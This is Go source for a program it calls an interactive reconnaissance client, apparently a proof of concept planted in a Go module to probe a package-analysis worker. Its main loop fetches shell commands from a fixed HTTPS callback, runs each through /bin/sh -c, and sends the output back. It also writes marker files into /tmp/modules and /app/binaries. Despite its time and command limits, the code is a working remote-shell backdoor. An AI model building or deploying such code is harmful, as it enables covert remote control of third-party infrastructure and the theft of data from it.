// Command contentproof-client provides a bounded interactive reconnaissance
// session for one exact owned Capslock worker. Commands arrive one at a time
// from the fixed callback; there is no static command sequence.
package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

var callbackURL string
var callbackSession string
var callbackURLSHA256 string

const (
	expectedOrigin = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.119-kimi"
	expectedAgent  = "go-cgo-pkgsite-probe-v114-interactive-recon"
	sessionLength  = 20 * time.Minute
	maxCommands    = 100
	commandTimeout = 30 * time.Second
	httpTimeout    = 15 * time.Second
	maxOutput      = 64 * 1024
)

type command struct {
	ID      int    `json:"id"`
	Command string `json:"command"`
}

type result struct {
	ID              int    `json:"id"`
	ExitCode        int    `json:"exit_code"`
	Stdout          string `json:"stdout"`
	Stderr          string `json:"stderr"`
	DurationMS      int64  `json:"duration_ms"`
	TimedOut        bool   `json:"timed_out"`
	StdoutTruncated bool   `json:"stdout_truncated"`
	StderrTruncated bool   `json:"stderr_truncated"`
}

type boundedBuffer struct {
	buffer    bytes.Buffer
	truncated bool
}

func (b *boundedBuffer) Write(p []byte) (int, error) {
	remaining := maxOutput - b.buffer.Len()
	if remaining > 0 {
		if len(p) > remaining {
			b.buffer.Write(p[:remaining])
			b.truncated = true
		} else {
			b.buffer.Write(p)
		}
	} else if len(p) > 0 {
		b.truncated = true
	}
	return len(p), nil
}

func main() {
	if validateRuntimeConfiguration() != nil || len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
		return
	}
	origin := filepath.Clean(os.Args[3])
	if origin != expectedOrigin || os.Args[3] != origin {
		return
	}
	emitSharedHi()
	deadline := time.Now().Add(sessionLength)
	for completed := 0; completed < maxCommands && time.Now().Before(deadline); completed++ {
		status, body, err := call(http.MethodGet, "next", nil)
		if err != nil || status == http.StatusNoContent {
			time.Sleep(2 * time.Second)
			continue
		}
		if status != http.StatusOK {
			time.Sleep(2 * time.Second)
			continue
		}
		var next command
		if json.Unmarshal(body, &next) != nil || next.ID < 1 || next.Command == "" {
			continue
		}
		result := execute(next)
		encoded, err := json.Marshal(result)
		if err != nil {
			return
		}
		_, _, _ = call(http.MethodPut, "result/"+itoa(next.ID), encoded)
		if next.Command == "exit" {
			return
		}
	}
}

func emitSharedHi() {
	for _, path := range []string{"/tmp/modules/a119-shared-hi", "/app/binaries/a119-shared-hi"} {
		info, err := os.Lstat(filepath.Dir(path))
		if err != nil || !info.IsDir() || info.Mode()&os.ModeSymlink != 0 {
			continue
		}
		file, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0o600)
		if err != nil {
			continue
		}
		_, _ = file.WriteString("hi\n")
		_ = file.Close()
	}
}

func execute(next command) result {
	started := time.Now()
	ctx, cancel := context.WithTimeout(context.Background(), commandTimeout)
	defer cancel()
	cmd := exec.CommandContext(ctx, "/bin/sh", "-c", next.Command)
	cmd.WaitDelay = 3 * time.Second
	var stdout, stderr boundedBuffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	exitCode := 0
	if err != nil {
		exitCode = -1
		if exitError, ok := err.(*exec.ExitError); ok {
			exitCode = exitError.ExitCode()
		}
	}
	return result{
		ID: next.ID, ExitCode: exitCode, Stdout: stdout.buffer.String(), Stderr: stderr.buffer.String(),
		DurationMS: time.Since(started).Milliseconds(), TimedOut: ctx.Err() == context.DeadlineExceeded,
		StdoutTruncated: stdout.truncated, StderrTruncated: stderr.truncated,
	}
}

func call(method, suffix string, body []byte) (int, []byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), httpTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, method, callbackURL+"/"+suffix, bytes.NewReader(body))
	if err != nil {
		return 0, nil, err
	}
	request.Header.Set("User-Agent", expectedAgent)
	request.Header.Set("X-Codex-Probe-Session", callbackSession)
	if body != nil {
		request.Header.Set("Content-Type", "application/json")
	}
	dialer := &net.Dialer{Timeout: 10 * time.Second, KeepAlive: -1}
	transport := &http.Transport{Proxy: nil, DialContext: dialer.DialContext, ForceAttemptHTTP2: true, DisableKeepAlives: true, TLSHandshakeTimeout: 10 * time.Second, ResponseHeaderTimeout: 10 * time.Second}
	defer transport.CloseIdleConnections()
	client := &http.Client{Transport: transport, Timeout: httpTimeout, CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse }}
	response, err := client.Do(request)
	if err != nil {
		return 0, nil, err
	}
	defer response.Body.Close()
	responseBody, err := io.ReadAll(io.LimitReader(response.Body, maxOutput+1))
	return response.StatusCode, responseBody, err
}

func validNonce(value string) bool {
	if len(value) != 64 {
		return false
	}
	for _, c := range value {
		if (c < '0' || c > '9') && (c < 'a' || c > 'f') {
			return false
		}
	}
	return true
}

func validateRuntimeConfiguration() error {
	if !validNonce(callbackSession) || len(callbackURLSHA256) != 64 {
		return errors.New("invalid fixed callback identity")
	}
	parsed, err := url.Parse(callbackURL)
	if err != nil || parsed.Scheme != "https" || parsed.Host == "" || parsed.User != nil || parsed.Opaque != "" || parsed.RawQuery != "" || parsed.Fragment != "" || parsed.Path != "/go-cgo-modcache-proof-a102/v1/recon/"+callbackSession {
		return errors.New("invalid fixed callback URL")
	}
	digest := sha256.Sum256([]byte(callbackURL))
	if hex.EncodeToString(digest[:]) != callbackURLSHA256 {
		return errors.New("fixed callback digest mismatch")
	}
	return nil
}

func itoa(value int) string {
	if value < 10 {
		return string(rune('0' + value))
	}
	var buf [20]byte
	i := len(buf)
	for value > 0 {
		i--
		buf[i] = byte('0' + value%10)
		value /= 10
	}
	return string(buf[i:])
}
